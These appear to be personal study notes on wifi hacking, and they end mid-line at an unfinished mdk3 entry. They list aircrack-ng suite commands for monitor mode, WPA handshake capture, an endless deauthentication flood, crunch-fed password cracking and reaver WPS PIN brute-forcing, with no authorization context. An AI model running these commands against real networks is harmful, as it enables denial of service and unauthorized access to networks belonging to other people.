## Notes on wifi hacking

- **reaver** a tool for gussing pins on router
- In wireless protocol MAC address not encrypted.

- `airmon-ng start wlan0mon 9[optional channel number]` put wireless card in monitor mode and changes wireless card name .

- `airmon-ng check wlan0mon ` check all process where may cause problem for monitoring.

- using `airmon-ng check kill` to kill problem maker processes.

- `airodump-ng wlan0mon` monitor all wireless signals in our env.

- **BSSID** is MAC address

- **PWR** is strength of signal and whatever greater is better signal. recomended is greater than -60

- `airodump-ng --bssid 08:86:30:74:22:76 -c 6[channel] --write WPAcrack[file to write handshake] wlan0mon` for capturing specific access point.

- **station** is a device that connect to the access point.

- `aireplay-ng -0 0 -a 08:86:30:74:22:76 wlan0mon` in an ifinity loop send deauthenticate packet to access point and deauthenticate each othe on the network. kind of DoS attack.
`-0` is deauthenticate attack selection.
`0` indicates to ifinity loop 
`-a 08:86:30:74:22:76` wireless MAC address.

- `crunch 11 11 -t %%%%hunder 1234567890 | aircrack-ng -w - SCAN_file.cap -e[essid] something` example of using aircrack-ng with crunch to crack the password. of course crunch man page is a good guaid to set a better setting. 

- `wash` is a tool to WiFi protect setup scan.

- there where scripts in web for gussing wifi default pin.

- in using reaver it is recomended to  default MAC address 

- example of using **reaver** ‍‍‍‍‍`reaver -i wlan0mon -b 08:86:30:74:22:76 -vv`

- changing channel of my wireless card. `iwconfig wlan0mon channel [1-14]`-

## mdk3

- `mdk3 wlan0mon 